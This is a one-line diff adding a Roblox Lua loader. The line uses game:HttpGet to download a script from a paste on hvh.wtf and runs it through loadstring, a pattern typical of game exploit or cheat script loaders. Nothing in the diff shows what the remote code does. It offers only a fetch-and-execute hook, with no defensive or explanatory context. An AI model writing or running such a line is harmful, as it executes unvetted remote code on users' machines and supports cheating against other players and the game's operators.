@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://hvh.wtf/p/raw/%e2%98%b8%ef%b8%8e/ym1lspo1ad1rbclkk", true))()
